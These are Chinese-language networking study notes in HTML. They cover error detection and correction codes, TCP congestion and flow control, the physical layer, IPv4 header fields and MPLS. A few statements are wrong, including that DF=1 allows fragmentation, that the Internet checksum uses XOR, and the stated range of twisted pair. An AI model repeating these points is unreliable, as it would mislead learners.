<pre><code>传输数据'a' 0b1100001
1   2   3   4   5   6   7   8   9   10  11
        1       0   0   0       0   1   1       原始数据
0 = (3)^(5)^(7)^(9)^(11) 
    1 = (3)^(6)^(7)^(10)^(11)
            0 = (5)^(6)^(7)
                            0 = (9)^(10)^(11)
0   1   1   0   0   0   0   0   0   1   1       编码结果

校验，比如第11位从1-&gt;0。如果发现了1个bit的错可以纠正。
那么我们会发现第1,2,8偶校验得到的结果是都不对，1+2+8 = 11。
</code></pre>
<h2 id="卷积码纠错"><a class="header" href="#卷积码纠错">卷积码（纠错）</a></h2>
<h2 id="里德所罗门码纠错"><a class="header" href="#里德所罗门码纠错">里德所罗门码（纠错）</a></h2>
<h2 id="crc循环冗余码检错star"><a class="header" href="#crc循环冗余码检错star">CRC循环冗余码（检错）:star:</a></h2>
<p>几乎所有的局域网（如以太网、 802.11 ）和点到点链接使用。CRC为校验和的一种，是两个字节数据流采用<strong>二进制除法</strong>（没有进位，使用XOR来代替减法）相除所得到的余数。其中被除数是需要计算校验和的信息数据流的二进制表示；<strong>除数是一个长度为$(n+1)$的预定义（短）的二进制数</strong>，通常用多项式的系数来表示。在做除法之前，要<strong>在信息数据之后先加上$n$个0（之后用来存校验码）</strong>。由于本函数易于用二进制的电脑<strong>硬件使用</strong>、容易进行数学分析并且尤其善于检测传输通道干扰引起的错误，因此获得广泛应用。</p>
<p>比如，我们要发送的原始数据为$1101_0110_11$，我们希望用4位的CRC校验码。</p>
<p>那么，我们的生成多项式（除数）应该是5位，常用的为$10011$。</p>
<pre><code>             1100 00 1010
      -------------------
10011 | 1101 0110 11 0000     // 在末尾补充4个0
        1001 1                // 这里是二进制减法，也是二进制加法，就是xor
      --------------
         100 11              
         100 11
      --------------
               10 11 0
               10 01 1
          -----------------
                  10 100
                  10 011
                ----------------
                     1110     // 最后的余数
</code></pre>
<p>所以，我们的$checksum = 1110$，最后发送的数据为$1101_0110_11_1110$。接受者在进行校验的时候，将$1101_0110_11_1110$和$1110$做二进制除法，如果余数是0，说明没有差错。</p>
<h2 id="校验和检错"><a class="header" href="#校验和检错">校验和（检错）</a></h2>
<p>TCP，UDP，IP协议使用的都是校验和。</p>
<ul>
<li>发送方：把要检验的数据划分为k段，每段的长度都是n位（通常n=16），将校验和字段先清零。把每一段异或起来，将得到的<strong>和的反码</strong>写入检验和字段，填入校验和字段。</li>
<li>接收方：收到数据报后，将所有n位字（包括校验码）再使用异或运算相加一次，即得出接收方检验和的计算结果。如果首部未发生任何变化，那么结果为全1。</li>
</ul>
<p>IP的校验和检验的是<strong>首部</strong>，TCP和UDP的校验和检验的是<strong>首部、数据和伪首部</strong>。</p>
<h2 id="奇偶校验检错"><a class="header" href="#奇偶校验检错">奇偶校验（检错）</a></h2>
<p>奇偶校验，n-1位信息元+1位校验元。让校验元=原有数据序列中（包括你要加上的一位）1的个数为奇数个。只能检测出奇数比特错误。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="拥塞控制和流量控制"><a class="header" href="#拥塞控制和流量控制">拥塞控制和流量控制</a></h1>
<!-- toc -->
<p>拥塞(Congestion): 网络中存在太多的数据包导致数据包被延迟和丢失，降低了传输性能，这种情况称为拥塞。</p>
<p>网络层和传输层共同承担处理拥塞的责任。控制拥塞的最有效方法是减少传输层注入网络的负载。拥塞产生最严重的后果是死锁。</p>
<p>值得指出的是<strong>拥塞控制</strong>和<strong>流量控制</strong>之间有很大的差异，它们之间的关系非常微妙。拥塞控制的任务是确保网络能够承载所有到达的流量。这是一个全局性的问题，涉及各方面的行为，包括所有的主机和所有的路由器。与此相反，流量控制只与特定的发送方和特定的接收方之间的点到点流量有关。它的任务是确保一个<strong>快速的发送方不会持续地以超过接收方接收能力的速率传输数据</strong>。</p>
<h2 id="网络层拥塞控制"><a class="header" href="#网络层拥塞控制">网络层拥塞控制</a></h2>
<p>拥塞的出现意味着负载（暂时）大于资源（在网络的一部分〉可以处理的能力。很自然人们能想到两个解决方案：增加资源或减少负载。</p>
<ol>
<li>给路由器、链路升级，增加带宽。</li>
<li>流量感知的路由，根据每天的流量模式定制路由。</li>
<li>准入控制。在虚电路网络中，可以选择拒绝新连接的建立减少负载。</li>
<li>流量调节。路由器监控使用的资源，确定合适快要接近拥塞，然后将反馈消息传递给造成拥塞的发送方。</li>
<li>负载脱离。当以上任何 种方法都无法消除拥塞时，路由器可以亮出它的杀手铜，即负载脱落，把某些数据包丢弃。对于要丢弃哪些数据包，有不同的策略。</li>
</ol>
<h2 id="tcp拥塞控制"><a class="header" href="#tcp拥塞控制">TCP拥塞控制</a></h2>
<p>UDP是没有拥塞控制的。我们来看看TCP拥塞控制的方法。TCP会不断的探索拥塞窗口<code>cwnd</code>。整个过程被概括为“慢启动、拥塞避免、快速回复”（下面的第三张图 ）</p>
<p>以一个较小的值开始，1个MSS。当被确认（收到ACK）的时候</p>
<ul>
<li>如果还没有达到<code>ssthresh</code>的阈值，<code>cwnd</code>翻倍。</li>
<li>如果达到了<code>ssthresh</code>的阈值，那么<code>cwnd++</code>。</li>
</ul>
<p>当我们收到三个重复的确认的时候，说明已经开始丢包了。<strong>可能</strong>是拥塞导致的，这个时候我们进行快速恢复（下面的第二张图）：</p>
<ul>
<li><code>cwnd/=2</code>，<code>ssthresh</code>也被设置为这个值。</li>
</ul>
<p>如果我们发现发送包超时了，这时我们进行慢启动（下面的第一张图）：</p>
<ul>
<li><code>ssthresh</code>设置成<code>cwnd/2</code>， <code>cwnd=1</code>。</li>
</ul>
<p>之后继续按照上面的规则增加<code>cwnd</code>，重复上面的过程。</p>
<img src="Basic/Networking/../images/image-20211128154443017.png" alt="image-20211128154443017" style="zoom:50%;" />
<img src="Basic/Networking/../images/image-20211126231926197.png" alt="image-20211126231926197" style="zoom:50%;" />
<img src="Basic/Networking/../images/Screenshot_2021-11-28-15-38-13-0591061228_EDIT_1638085110925.png" alt="Screenshot_2021-11-28-15-38-13-0591061228_EDIT_1638085110925" style="zoom: 67%;" />
<h2 id="流量控制协议"><a class="header" href="#流量控制协议">流量控制协议</a></h2>
<p>流量控制要处理的问题是：<strong>发送的速度太快而接受的速度太慢</strong>。</p>
<ul>
<li>发送窗口：发送方维持一组连续的允许发送的帧的序号。</li>
<li>接收窗口：接收方维持一组连续的允许接收的帧的序号。</li>
</ul>
<p>事实上，通过确认、超时重传、编号、校验，实现了<strong>可靠传输</strong>。</p>
<h3 id="stop-and-wait"><a class="header" href="#stop-and-wait">Stop and Wait</a></h3>
<p><img src="Basic/Networking/../images/1612945466983.jpg" alt="" /></p>
<p>可能出现的意外情况。</p>
<ul>
<li>第一种，如果Sender发送的包丢失了。Sender在很久之后没有收到ACK会选择重发。</li>
<li>第二种，如果Receiver发送的ACK丢失了。Sender在很久之后没有收到ACK会选择重发。那Receiver就很迷惑了，这个包是哪个？是新的包，还是旧的包？所以我们需要<strong>给包编号</strong>，对于Stop and Wait，1 bit的就够了（这也是下面GBN公式N=1的情况）。</li>
</ul>
<p>你也可以认为stop and wait就是两个窗口大小都是1的GBN。</p>
<h3 id="go-back-n"><a class="header" href="#go-back-n">Go back N</a></h3>
<p><img src="Basic/Networking/../images/image-20211101101833934.png" alt="image-20211101101833934" /></p>
<p>在GBN协议中，允许发送方发送多个分组而不需要等待确认。但是在流水线中未确认的分组数不能超过某个最大的允许数$N$（即发送窗口大小$W_t$）。我们将<code>base</code>定义成 <strong>最早未确认的分组的序号</strong>。将<code>nextseqnum</code>定义成最小的未使用序号。</p>
<p>采用<strong>累积确认</strong>的方式，<strong>ACK(N)表示接收方已经收到N号帧和它之前的全部帧</strong>。所以，如果Receiver收到了1345但是没收到2，只会发送ACK(1)并<strong>丢弃345</strong>；如果Sender只收到了ACK(1),ACK(3),ACK(5)，Sender知道其实12345都已经被接收成功了，下一个发送6。</p>
<p>如果出现超时，发送方重传所以已发送但未被确认的帧。类似的，超时可能是发送的数据丢失或者ACK丢失。</p>
<p>采用N个比特对frame进行编号，那么<strong>发送窗口的尺寸</strong>满足$1\le W_t \le2^n-1$。否则就无法区别旧帧和新帧。接收窗口大小为1。</p>
<h3 id="selective-repeat-protocol"><a class="header" href="#selective-repeat-protocol">Selective repeat protocol</a></h3>
<p><img src="Basic/Networking/../images/image-20211101105357811.png" alt="image-20211101105357811" /></p>
<p>GBN和SR都属于<strong>连续ARQ协议</strong>。</p>
<blockquote>
<p>GBN: 如果收到了1345但是没收到2，只会发送ACK(1)并丢弃345。</p>
</blockquote>
<p>GBN直接丢弃了失序的包，也是一种浪费。我们想只重传出错的帧。<strong>究其原因，是因为接收方窗口大小为1，对于不按序到达的包没有地方缓存</strong>。所以Selective repeat protocol接收方窗口大于1 。</p>
<p>也是采用累积确认的方式，<strong>ACK(N)表示接收方已经收到N号帧和它之前的全部帧</strong>。只不过以上面的例子，我在收到2之后就直接发送ACK(5)了，因为我已经把34缓存了。</p>
<p>发送窗口和接受窗口的尺寸要满足$W_T \le 2^{n-1}$，否则也是无法区分新包和旧包。一般情况我们认为发送窗口和接受窗口是一样大的。</p>
<blockquote>
<p>具体解释，是</p>
<ol>
<li>$发送窗口+接受窗口 \leq 2^n$</li>
<li>$发送窗口 \geq 接受窗口$</li>
</ol>
<p>设想这样一个场景，3bit，发送窗口为5，接受窗口为4。</p>
<p>发送方发送0,1,2,3,4，接受者都收到了，返回ACK(4)，移动接受窗口，等待5,6,7,0。结果ACK丢了，发送方重传了0。</p>
<p>所以接收方就把老0当新0了，这就是所谓的分不清旧帧和新帧。</p>
</blockquote>
<h2 id="tcp流量控制"><a class="header" href="#tcp流量控制">TCP流量控制</a></h2>
<p>TCP采用<strong>滑动窗口</strong>机制。</p>
<p><img src="Basic/Networking/../images/Screenshot_2021-11-28-15-15-42-0808075360_EDIT_1638083766474.png" alt="Screenshot_2021-11-28-15-15-42-0808075360_EDIT_1638083766474" /></p>
<p>在通信的过程中，接收方根据自己接收缓存的大小，动态的调整<strong>接收窗口rwnd</strong>的大小。发送方的发送窗口取$min(rwnd,cwnd)$，即接收窗口和拥塞窗口的较小者。</p>
<ul>
<li>TCP使用累计应答的方式。这一点与连续ARQ类似。</li>
<li>TCP在接收端会设置缓存，来缓存正确接收但是失序的分组，这点与SR类似。（实际上TCP RFC并没有对接收端要怎样处理失序到达的分组提出要求，但是在接收端设置缓存是实践中大家都采用的方法）</li>
<li>TCP使用快速重传机制：如果收到对于一个特定报文段的3个冗余ACK，则在超时事件发生前就会对该报文段进行重传，这大大节约了时间。</li>
<li>注意：TCP中的ack是指接收端希望从发送端收到的下一字节的序号。这个和之前介绍的略有不同，但是实现的效果是类似的的。例如发送端发送了编号为0-5的字节，这时接收端成功接收后就会发送ack为6。</li>
<li>对于最后0窗口的情况，为了避免“死锁”，会计时。如果超时了还没有收到窗口不为0的通知，会发送<strong>探测报文段</strong>。</li>
</ul>
<p><img src="Basic/Networking/../images/image-20211127162904324.png" alt="image-20211127162904324" /></p>
<h2 id="链路层流量控制"><a class="header" href="#链路层流量控制">链路层流量控制</a></h2>
<p>网络层需要流量控制吗？ 网络层点对点之间的传输，其实还是经过链路层的。所以IP协议里没有流量控制。</p>
<p>那么链路层流量控制有什么办法呢？就是上面的办法。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="物理层"><a class="header" href="#物理层">物理层</a></h1>
<p>这一章对我来说不算重点，应付考试。看书更好。</p>
<p><img src="Basic/Networking/../images/1615105504394.jpg" alt="" /></p>
<p>物理层解决如何在<strong>传输媒体</strong>上传输数据比特流。
确定与传输媒体接口有关的一些特性：</p>
<ol>
<li>械特性 - 指明接口所用接线器的形状和尺寸、引线数目和排列、固定和锁定装置等</li>
<li>电气特性 - 指明在接口电缆的各条线上出现的电压的范围</li>
<li>功能特性 - 规定物理接口上各条信号线的功能分配和确切定义（各条线上出现各种电压表示何意义）</li>
<li>规程特性 - 定义了各信号线的工作顺序和时序，使得比特流传输得以完成。</li>
</ol>
<h2 id="通信基础概念"><a class="header" href="#通信基础概念">通信基础概念</a></h2>
<p>信号的传输方式有串行传输和并行传输。</p>
<ul>
<li>串行传输 速度慢，费用低，适合远距离，不容易出错。</li>
<li>并行传输 速度快，费用高，适合近距离，计算机内部多用。
<img src="Basic/Networking/../images/1614496936599.jpg" alt="" /></li>
</ul>
<p>从通信信道的介质上看，分为无线信道和有线信道。从通信信道传输的信号形式上看，分为模拟信道和数字信道。</p>
<p>从通信双方的交互方式上看，有三种通信方式：</p>
<ol>
<li>单工通信：只有一个方向的通信，只需要一条信道。</li>
<li>半双工通信：通信的双方都可以发送或接收信息，但是不能同时发送。需要两条信道。</li>
<li>全双工通信：通信的双方都可以发送或接收信息，允许同时发送。</li>
</ol>
<ul>
<li>码元：一个固定时长的信号波形。代表不同离散数值的基本波形，是数字通信中数字信号的基本传输单位。通常都是二进制码元，有0和1，也可以不是二进制，而是可能代表N种离散数值。</li>
<li><strong>速率</strong>：指数据的传输速率，表示单位时间内传输的数据量。可以用码元传输速率和信息传输速率表示。
<ul>
<li>信息传输速率指的是1秒能传输多少bit（二进制码元），单位是b/s。</li>
</ul>
</li>
<li>数字带宽：单位时间内某一点到另一点所能通过的 <strong>最高数据率</strong>，理想的速率。</li>
<li>模拟带宽：信道的频带宽度，单位是 Hz</li>
</ul>
<h2 id="编码与调制1"><a class="header" href="#编码与调制1">编码与调制1</a></h2>
<ul>
<li>数据：传送信息的实体，通常是有意义的符号序列。</li>
<li>信号：数据的电气、电磁表现
<ul>
<li>数字信号：参数取值离散</li>
<li>模拟信号：参数取值连续</li>
</ul>
</li>
<li>信源：产生和发送数据的源头</li>
<li>信宿：接收数据的终点。</li>
<li><strong>信道channel</strong>：信号灯传输媒介。一般用来表示<strong>向某一个方向</strong>传送信息的介质。
<ul>
<li>根据传输介质分为 无线信道和有限信道</li>
<li>根据传输信号不同分为 模拟信道和数据信道</li>
</ul>
</li>
<li>宽带和基带</li>
</ul>
<p><img src="Basic/Networking/../images/1614516554288.jpg" alt="" /></p>
<ul>
<li>把数据变成数字信号，称为<strong>编码</strong>。把数据变成模拟信号，称为<strong>调制</strong>。</li>
</ul>
<h3 id="两个公式-信道的极限容量-star"><a class="header" href="#两个公式-信道的极限容量-star">两个公式-信道的极限容量 :star:</a></h3>
<ul>
<li>信道<strong>带宽</strong>：信道能够通过的最高频率和最低频率之差，单位是Hz。</li>
<li>码间串扰：接收端接收到的信号波形失去了码元间清晰界限的现象。所以频率越高越容易发生码间串扰。</li>
<li><strong>奈氏准则</strong>：在理想低通（带宽受限，无噪声）条件下，为了避免码间串扰，极限码元传输速率为2W Baud，<strong>W是信道模拟带宽</strong>，单位是Hz。这个是<a href="https://www.zhihu.com/question/40443733/answer/1459206942">通信原理</a>的内容了，我只能记住了。。。</li>
</ul>
<p>所以<em>极限数据传输速率</em>$=2Wlog_{2}V\ (b/s)$，V是码元的离散电平数目。所以，要想提高数据的传输速率，可以提高每个码元携带的信息量。</p>
<ul>
<li>S/N = 信号的平均功率S/噪声的平均功率N。不过我们一般使用<em>信噪比(dB)</em>$=10log_{10}(S/N)$ 来衡量噪声的大小。</li>
<li><strong>香农定理</strong>：信道的<em>极限数据传输速率</em>$=Wlog_2(1+S/N)\ (b/s)$</li>
</ul>
<p>所以，对于一定的传输带宽和一定的信噪比，信息传输速率上限就确定了。用奈氏准则和香农定理计算，取小的那个。</p>
<h3 id="数字数据编码为数字信号star"><a class="header" href="#数字数据编码为数字信号star">数字数据编码为数字信号:star:</a></h3>
<p><img src="Basic/Networking/../images/1614518528896.jpg" alt="" /></p>
<p>经典以太网使用曼彻斯特编码。</p>
<p>除此之外，还有4b/5b编码，这样只需要增加25%的带宽。快速以太网，ATM使用。</p>
<h3 id="数字数据调制为模拟信号star"><a class="header" href="#数字数据调制为模拟信号star">数字数据调制为模拟信号:star:</a></h3>
<p><img src="Basic/Networking/../images/1614521712748.jpg" alt="" /></p>
<h3 id="模拟数据编码为数字信号"><a class="header" href="#模拟数据编码为数字信号">模拟数据编码为数字信号</a></h3>
<p>抽样-量化-编码。
抽样的频率应该比数据的频率大两倍以上才能得到可靠的信号。</p>
<h3 id="模拟数据调制为模拟信号"><a class="header" href="#模拟数据调制为模拟信号">模拟数据调制为模拟信号</a></h3>
<h2 id="数据交换"><a class="header" href="#数据交换">数据交换</a></h2>
<ul>
<li>
<p>电路交换。在数据交换之前，两个节点必须先建立一条双方独占的<strong>物理通信路径</strong>（建立连接），之后的通信直接通过这个路径进行。</p>
</li>
<li>
<p>报文交换。数据交换的单位是报文，报文携带有目的地址，源地址等信息。报文交换在交换节点采用<strong>存储转发</strong>的方式。</p>
</li>
<li>
<p>分组交换。数据交换的单位是分组，和报文交换很像，不过限制了每次传送数据块的大小上限，也就是说太大的报文会被分成若干个小的分组。</p>
<p>分组交换根据其通信子网向端点系统提供的服务，还可进一步分为面向连接的虚电路方式和无连接的数据报方式。这两种服务方式都由网络层提供。要注意数据报方式和虚电路方式是分组交换的两种方式。</p>
<ul>
<li>数据报：</li>
</ul>
</li>
</ul>
<h2 id="传输介质"><a class="header" href="#传输介质">传输介质</a></h2>
<p><img src="Basic/Networking/../images/1615104897835.jpg" alt="" />
传输介质不属于物理层。</p>
<ul>
<li>导向性传输介质：
<ul>
<li>双绞线-价格便宜，局域网中常用。通信距离一般为几到数十公里。</li>
<li>同轴电缆：分为基带同轴电缆，常用于局域网；和宽带同轴电缆，常用于有线电视系统。抗干扰性更好，传输距离更远，价格更贵。</li>
<li>光纤：通过光脉冲来通信，带宽非常大。体积小重量轻。价格高。</li>
</ul>
</li>
<li>非导向性传输介质：
<ul>
<li>无线电波：信号向所有方向传播。穿透能力强，可传远距离。带宽低。</li>
<li>微波：信号沿着固定方向传播。通信频率高，波段范围宽，所以数据率高。 卫星通信。</li>
<li>红外线和激光：信号沿着固定方向传播。</li>
</ul>
</li>
</ul>
<h2 id="信道的复用-star"><a class="header" href="#信道的复用-star">信道的复用 :star:</a></h2>
<ul>
<li>
<p>FMD：所有的用户在同样的时间占用不同带宽（这里的&quot;带宽&quot;是频率带宽而不是数据的发送速率）资源。</p>
<ul>
<li>当多个信道被复用在一起时，比语音通信所需多出来的那部分频带称为保护带（ guard band ），它使信道之间完全隔离。</li>
</ul>
</li>
<li>
<p>TDM：所有的用户在不同的事件占用同样的频带宽度。</p>
<ul>
<li>2.048 Mbps 的 E1载波。E1载波有32个8比特数据样值被封装在125us的帧中，32个信道中的30	个用于传输信息，2个用作信令。每四个帧为一组。</li>
<li>1.544 Mbps 的 T1载波。Tl 载波包含 24 条被复用在一起的语音信道，每个信道依次将8比特(7个数据比特和1个信令)的样值插入到输出流中。每帧包含 24*8=192 个比特，再加上额外一个比特用于控制，因而每 125 微秒产生 193个比特。</li>
</ul>
</li>
<li>
<p><strong>CDMA</strong>： 码分复用 CDM（Code Division Multiplexing）是另一种共享信道的方法。实际上，人们更常用的名词是码分多址 CDMA（Code Division Multiple Access）。每一个用户可以在同样的时间使用同样的频带进行通信。由于各用户使用经过特殊挑选的不同码型，因此各用户之间不会造成干扰。码分复用最初用于军事通信，因为这种系统发送的信号有<strong>很强的抗干扰</strong>能力，其频谱类似于白噪声，不易被敌人发现。灵活，利用率高。</p>
<p>CDMA中每个比特时间被分成m个更短的时间间隔。每个站被分配得到唯一的m位码，称为<strong>码片序列</strong>。若要发送比特1，站就发送分配给它的码片序列；若要发送比特0，它就发送其码片序列的反码。</p>
</li>
</ul>
<h2 id="宽带接入技术"><a class="header" href="#宽带接入技术">宽带接入技术</a></h2>
<p>用户要连接到互联网，必须先连接到某个 ISP，以便获得上网所需的 IP 地址。</p>
<ul>
<li><strong>非对称数字用户线 ADSL</strong>（Asymmetric Digital Subscriber Line）技术是用数字技术对现有的<strong>模拟电话用户线</strong>进行改造，使它能够承载宽带数字业务。这里的非对称指的是上传速度小于下载速度。ADSL 最大的好处就是可以利用现有电话网中的用户线（铜线），而不需要重新布线。</li>
<li><strong>光纤到户 FttH</strong></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="网络层-ip"><a class="header" href="#网络层-ip">网络层 IP</a></h1>
<p>对于网络层应该是否应该提供有连接的服务(<strong>connection-orient or connectionless</strong>)曾经引起很大的争论，但是现在网络层是事实标准IP协议采用了无连接的方式。</p>
<p><img src="Basic/Networking/../images/image-20211027113027335.png" alt="虚电路服务和数据报服务的对比" /></p>
<h2 id="internet"><a class="header" href="#internet">Internet</a></h2>
<p>在网络层，可以把Internet 看作是一种相互关联的网络或自治域（自治系统）集合。下面这个图简略的描述了Internet的结构，值得注意的是，这里面的每一个网络内部不一定要使用IP协议，可以通过下面介绍MPLS加深理解。</p>
<p><img src="Basic/Networking/../images/image-20211109151603146.png" alt="image-20211109151603146" /></p>
<h2 id="ip协议"><a class="header" href="#ip协议">IP协议</a></h2>
<p>IP是Internet Protocol的缩写，只要想通过Internet进行连接就<strong>必须使用IP协议</strong>。IP datagrams由header和data组成。IP协议是一个简单的协议，也是最重要的协议。</p>
<div class="table-wrapper"><table><thead><tr><th>Property</th><th>Behavior</th></tr></thead><tbody>
<tr><td>Datagram</td><td>传递的是互相独立的Datagram，SA DA Data</td></tr>
<tr><td>Unreliable</td><td>Packet有可能丢失</td></tr>
<tr><td>Best effort</td><td>尽最大的努力完成Packet的传递，但是不做任何保证，不会检测错误</td></tr>
<tr><td>Connectionless</td><td>无连接，不保证Packet的顺序</td></tr>
</tbody></table>
</div>
<p>**End-to-end原则：只要能在端点实现的功能，就在端点实现。**所以我们不让IP成为一个可靠的服务，而是让TCP成为可靠的服务，当然这是原因之一。</p>
<h3 id="ip提供的服务"><a class="header" href="#ip提供的服务">IP提供的服务</a></h3>
<ol>
<li>防止packet死循环。</li>
<li>将把太长的Packet分段（比如，下一层只能一次传输1500byte，但是一个Packet超过了这个大小）。这也意味着我们需要把它正确的按顺序重组。</li>
<li>我们有对Header进行检验的Checksum，减少数据包传递到错误地方的可能性。</li>
<li>有IPv4和IPv6。</li>
<li>IP允许添加新的字段到Header。</li>
</ol>
<h3 id="ipv4地址"><a class="header" href="#ipv4地址">IPv4地址</a></h3>
<p>最开始IP地址的分类是这样的，分成网络号+主机号。还有一些特殊的IP地址。</p>
<p><img src="Basic/Networking/../images/image-20211027114538526.png" alt="image-20211027114538526" /></p>
<p><img src="Basic/Networking/../images/image-20211027115225855.png" alt="特殊IP地址" /></p>
<p>在同一个局域网内的主机和路由器的IP地址中的网络号应该是一样的。对于一个路由器，因为连接了几个局域网，在每个局域网中都有不一样的IP地址。</p>
<p>我们还在链路层学过物理地址(MAC地址，硬件地址常常为同义词)。关于IP地址到MAC地址的转换，是<a href="Basic/Networking/./ARP.html">ARP协议</a>的工作。</p>
<h3 id="ipv4-datagram"><a class="header" href="#ipv4-datagram">IPv4 Datagram</a></h3>
<p><img src="Basic/Networking/../images/1612533521772.png" alt="" /></p>
<ul>
<li>
<p>版本：IPv4和IPv6。</p>
</li>
<li>
<p>首部长度：最大值是15，单位是4byte。在一般情况下可选字段为空，首部长度字段为5。</p>
</li>
<li>
<p>总长度：<strong>首部和数据部分的总长度，单位为byte</strong>，所以数据报的最大长度为65535 bytes。然而传送这么长的数据报在现实中是极少遇到的。因为</p>
</li>
<li>
<p>标识identification： IP软件在存储器中维持一个计数器，每产生一个数据报，计数器就加 1，并将此值赋给标识字段。但这个&quot;标识&quot;并不是序号，因为 IP 是无连接服务，数据报不存在按序接收的问题。当数据报由于长度超过网络的 MTU 而必须分片时，这个标识字段的值就被复制到所有的数据报片的标识字段中。相同的标识字段的值使分片后的各数据报片最后能正确地重装成为原来的数据报。</p>
</li>
<li>
<p>标志：3位</p>
<ul>
<li>MF(More Fragment)：最低位。MF=1表示后面还有分片，MF=0表示是最后一个数据包片。</li>
<li>DF(Don’t Fragment)：不能分片。当DF=1的时候才允许分片。</li>
</ul>
</li>
<li>
<p>片偏移(Fragment Offset)：较长的分组在分片后，某片在原分组的相对位置。片偏移以8个字节为单位。</p>
<p>因为一个链路层数据报能承载的最大数据是有限的，最大数据量被称为<strong>最大传送单元MTU</strong>。链路层MTU限制了IP数据报的长度，比如常见的以太网的MTU是1500 bytes，那么IP数据报总大小就不能超过1500 bytes，超了就要<strong>分片</strong>。</p>
</li>
<li>
<p>生存时间(<strong>TTL</strong>)：表明数据包在网络中的寿命，目的是为了防止无法交付的数据包无限制的在网络中兜圈子。路由器每次转发数据包都将TTL-1，如果TTL减小到0就丢弃这个数据包不再转发。</p>
<p>如果TTL设置为1，说明数据包只能在本局域网传送；利用TTL的性质结合ICMP超时报文，开发了<code>tracepath</code>。</p>
</li>
<li>
<p>协议：常见的如下。这里的IP指的是将IP数据报再封装到IP数据报中。</p>
<p><img src="Basic/Networking/../images/image-20211102201342694.png" alt="image-20211102201342694" /></p>
</li>
<li>
<p>首部校验和：顾名思义，只检验IP报文的首部而不包括数据部分。采用简单的加法。</p>
</li>
<li>
<p>源地址和目的地址：注意到这里的是32位，所以其实这个是IPv4的报文格式。IPv6的报文格式和IPv4的略有不同。</p>
</li>
</ul>
<h2 id="其他协议"><a class="header" href="#其他协议">其他协议</a></h2>
<p>这些协议和IP协议配套使用。</p>
<h3 id="icmp协议"><a class="header" href="#icmp协议">ICMP协议</a></h3>
<p>详见<a href="Basic/Networking/./ICMP.html">ICMP</a></p>
<h3 id="igmp协议"><a class="header" href="#igmp协议">IGMP协议</a></h3>
<p>IP组播，为了让源计算机一次发送的单个分组可以抵达用一个组地址标识的若干目标主机。</p>
<p>其实多播组的标识符就是 IP 地址中的<strong>D类地址</strong>。 IP 地址的前四位是 1110, 因此D类地址范围是 224.0.0.0 239.255.255.255 。我们就用每一个D类地址标志一个多播组。这样，D类地址共可标志 2^28 个多播组，也就是说，在同一时间可以允许有超过 2.6 亿的多播组在互联网上运行。多播数据报也是“尽最大努力交付“，不保证一定能够交付多播组内的所有成员。因此，多播数据报和一般的 IP 数据报的区别就是它使用 IP 地址作为目的地址，并且首部中的协议字段值是2, 表明使用<strong>网际组管理协议IGMP</strong>。</p>
<p><img src="Basic/Networking/../images/image-20211219204633509.png" alt="image-20211219204633509" /></p>
<h3 id="mpls协议"><a class="header" href="#mpls协议">MPLS协议</a></h3>
<p>https://towardsdatascience.com/multiprotocol-label-switching-mpls-explained-aac04f3c6e94</p>
<blockquote>
<p><strong>Multi-protocol label switching</strong> is a way to insure reliable connections for real-time applications, but it's expensive, leading enterprises to consider SD-WAN as a way to limit its use.</p>
</blockquote>
<p>我们知道IP协议转发数据包，是每个路由器根据IP和自己的路由表做forwarding。MPLS forwarding 和 IP forwarding 不同之处在于，MPLS的转发 based on the <strong>label</strong> present on the packet.所以也叫<strong>Label Switching</strong> 。</p>
<p>下面具体了解MPLS协议。我们可以认为MPLS在网络的第2.5层。</p>
<p><img src="Basic/Networking/../images/1_Umdp5m0NBwWmMx8TbcaJfw.png" alt="1_Umdp5m0NBwWmMx8TbcaJfw" /></p>
<blockquote>
<ol>
<li><strong>Label</strong>: The label field is of 20 bits, hence the label could take values from 0 to 2^20–1, or 1,048,575. However, the first 16 label values ie from 0 to 15 are exempted from normal use as they have a special meaning.</li>
<li><strong>Experimental(Exp):</strong> The three bits are reserved as experimental bits. They are used for Quality of Service(QoS).</li>
<li><strong>Bottom of Stack(BoS):</strong> A network packet can have more than one MPLS labels which are stacked one over another. To ensure which MPLS label is at the bottom of stack we have a BoS field which is of 1 bit. The bit is high (ie value 1) only when that particular label is at the bottom of the stack otherwise its value remains 0.</li>
<li><strong>Time to Live(TTL):</strong> The last 8 bits are used for Time to Live(TTL). This TTL has the same function as the TTL present in the IP header. Its value is simply decreased by 1 at each hop. The job of TTL is to avoid the packet being stuck in the network by discarding the packet if its value becomes zero.</li>
</ol>
</blockquote>
<p>那么他是怎么工作的呢？首先我们要有支持MPLS协议的路由器，能正确的处理MPLS Header。</p>
<p><img src="Basic/Networking/../images/1_Umdp5m0NBwWmMx8TbcaJfw-16364441068842.png" alt="1_Umdp5m0NBwWmMx8TbcaJfw" /></p>
<blockquote>
<ol>
<li><strong>Ingress LSR:</strong> These routers are present at the beginning of the MPLS network. Their job is to receive unlabeled IP packet and push the label on top of it.</li>
<li><strong>Egress LSR:</strong> These routers are present at the end of the MPLS network. Their job is to pop the label from the incoming packet and forward the packet as an IP packet.</li>
<li><strong>Intermediate LSR:</strong> These routers are present in between the above two routers. Their job is to receive the labeled packet, swap the label of the packet and forward it to the next hop. They are responsible for the MPLS forwarding of the packet.</li>
</ol>
<p>Ingress LSR和Egress LSR被称为Edge Router。An edge router is a specialized router located at a network boundary that enables an <strong>internal network to connect to external networks(Internet use IP)</strong></p>
<p>一般来说外部网络就是Internet了，Internet使用IP协议。所以无论一个Internal Network内部使用什么协议，在它将Package传输到Internet的时候，都要转换成IP协议的数据包。	</p>
</blockquote>
<h3 id="tunneling"><a class="header" href="#tunneling">Tunneling</a></h3>
<p>IP隧道技术：是路由器把一种网络层协议封装到另一个协议中以跨过网络传送到另一个路由器的处理过程。隧道技术是一种数据包封装技术，它是将原始IP包（其报头包含原始发送者和最终目的地）封装在另一个数据包（称为封装的IP包）的数据净荷中进行传输。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="networking-网络设备"><a class="header" href="#networking-网络设备">Networking-网络设备</a></h1>
<h2 id="modem"><a class="header" href="#modem">Modem</a></h2>
<p>调制解调器（英语：Modem，modulator-demodulator的英文缩写）是一个将<strong>数字信号调变到模拟信号</strong>上进行传输，并<strong>解调收到的模拟信号以得到数字信号</strong>的电子设备。它的目标是产生能够方便传输的模拟信号并且能够通过解码还原原来的数字信号。根据不同的应用场合，调制解调器可以使用不同的方法来传送模拟信号，比如使用光纤，射频无线电或电话线等。</p>
<h2 id="codec"><a class="header" href="#codec">Codec</a></h2>
